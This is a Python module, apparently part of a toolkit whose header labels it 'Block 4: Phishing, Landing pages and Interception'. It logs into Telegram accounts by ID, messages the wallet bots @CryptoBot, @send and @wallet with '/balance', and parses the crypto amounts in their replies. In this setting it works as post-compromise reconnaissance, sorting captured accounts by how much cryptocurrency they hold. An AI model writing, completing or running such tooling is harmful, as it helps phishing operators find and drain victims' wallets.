"""
Авто-проверка баланса крипто-ботов в Telegram.

Блок 4: Фишинг, Лендинги и Перехват.
"""
import asyncio
from typing import Optional
from core.logger import log


_CRYPTO_BOT_USERNAMES = {
    'cryptobot': '@CryptoBot',
    'send': '@send',
    'wallet': '@wallet',
}


async def check_crypto_balance(account_id: str, bot_username: str = '@CryptoBot') -> dict:
    """
    Проверяет баланс крипто-бота через Telegram-аккаунт.
    Отправляет /balance и парсит ответ бота.
    
    :param account_id: ID аккаунта
    :param bot_username: Username крипто-бота
    :return: {'balances': list, 'raw': str, 'error': str}
    """
    from services.telegram.actions import get_telegram_client
    import re
    
    client = await get_telegram_client(account_id)
    try:
        await client.send_message(bot_username, '/balance')
        await asyncio.sleep(3)
        
        messages = await client.get_messages(bot_username, limit=5)
        raw = ''
        for msg in messages:
            if msg.text and not msg.out:
                raw = msg.text
                break
        
        balances = []
        if raw:
            # Парсим строки вида "0.001 BTC", "10.50 USDT" и т.д.
            pattern = r'([\d.,]+)\s*(BTC|ETH|USDT|TON|USDC|BNB|LTC|TRX)'
            matches = re.findall(pattern, raw, re.IGNORECASE)
            for amount, currency in matches:
                try:
                    balances.append({'currency': currency.upper(), 'amount': float(amount.replace(',', '.'))})
                except ValueError:
                    pass
        
        return {'balances': balances, 'raw': raw}
    except Exception as e:
        log.error(f"check_crypto_balance error: {e}")
        return {'balances': [], 'error': str(e)}
    finally:
        await client.disconnect()


async def check_all_crypto_bots(account_id: str) -> dict:
    """
    Проверяет балансы во всех известных крипто-ботах.
    
    :param account_id: ID аккаунта
    :return: Словарь {bot_name: balance_result}
    """
    results = {}
    for name, username in _CRYPTO_BOT_USERNAMES.items():
        results[name] = await check_crypto_balance(account_id, username)
        await asyncio.sleep(1)
    return results
